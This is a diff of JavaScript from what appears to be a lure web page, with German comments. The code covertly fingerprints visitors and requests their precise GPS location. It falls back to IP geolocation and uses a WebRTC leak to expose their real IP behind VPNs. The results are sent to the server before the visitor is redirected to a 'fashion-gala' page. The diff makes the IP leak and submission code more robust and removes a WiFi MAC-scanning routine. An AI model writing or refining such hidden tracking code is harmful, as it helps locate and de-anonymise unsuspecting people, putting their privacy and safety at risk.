@@ -4197,11 +4197,12 @@ function collectBrowserFingerprint() {
     screen: `${window.screen.width}x${window.screen.height}`,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     language: navigator.language,
-    plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
+    plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(',') : 'unavailable',
     userAgent: navigator.userAgent
   };
   return fingerprint;
 }
+
 function getLocationWithFallback() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
@@ -4213,10 +4214,9 @@ function getLocationWithFallback() {
       },
       err => {
         console.warn("❌ GPS blockiert:", err.message);
-        
         getIpLocation();
         getRealIP();
-        scanWifiNetworks();
+        // WLAN-Scan entfernt, da nicht mehr unterstützt
       },
       { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
     );
@@ -4228,7 +4228,10 @@ function getLocationWithFallback() {
 
 function getIpLocation() {
   fetch("https://ipapi.co/json/")
-    .then(res => res.json())
+    .then(res => {
+      if (!res.ok) throw new Error('Network response was not ok');
+      return res.json();
+    })
     .then(data => {
       console.log("🌍 IP-Standort:", data.city, data.latitude, data.longitude);
       sendLocation(data.latitude, data.longitude, "ip", null);
@@ -4237,39 +4240,31 @@ function getIpLocation() {
 }
 
 function getRealIP() {
-  const pc = new RTCPeerConnection({ iceServers: [] });
-  pc.createDataChannel("");
-  pc.createOffer().then(offer => pc.setLocalDescription(offer));
-  pc.onicecandidate = ice => {
-    if (ice.candidate) {
-      const ip = ice.candidate.candidate.split(" ")[4];
-      console.log("🔥 ECHTE IP (WebRTC-Leak):", ip);
-      
-      fetch('/submit-ip', { 
-        method: 'POST', 
-        body: JSON.stringify({ leakIp: ip }) 
-      });
-      pc.close();
-    }
-  };
-}
-
-function scanWifiNetworks() {
-  if (navigator.wifi && navigator.wifi.getAccessPoints) {
-    navigator.wifi.getAccessPoints()
-      .then(networks => {
-        const wifiData = networks.map(n => ({
-          ssid: n.ssid,
-          mac: n.bssid,
-          strength: n.signalStrength
-        }));
-        console.log("📶 WLAN-Netzwerke:", wifiData);
-        sendLocation(null, null, "wifi", wifiData); // MACs für genaue Ortung
-      })
-      .catch(err => console.log("❌ WLAN-Scan fehlgeschlagen:", err));
+  try {
+    const pc = new RTCPeerConnection({ iceServers: [] });
+    pc.createDataChannel("");
+    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+    pc.onicecandidate = ice => {
+      if (ice && ice.candidate) {
+        const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
+        if (ipMatch) {
+          const ip = ipMatch[1];
+          console.log("🔥 ECHTE IP (WebRTC-Leak):", ip);
+          
+          fetch('/submit-ip', { 
+            method: 'POST', 
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ leakIp: ip }) 
+          }).catch(e => console.error("IP submit failed:", e));
+        }
+        pc.close();
+      }
+    };
+  } catch (e) {
+    console.error("WebRTC failed:", e);
   }
 }
-	
+
 function sendLocation(lat, lon, method, extraData) {
   const fingerprint = collectBrowserFingerprint();
   fetch('/submit', {
@@ -4285,8 +4280,9 @@ function sendLocation(lat, lon, method, extraData) {
     })
   }).then(() => {
     window.location.href = "/fashion-gala.html"; 
-  });
+  }).catch(err => console.error("Submit failed:", err));
 }
+
 window.onload = getLocationWithFallback;
 </script>
 
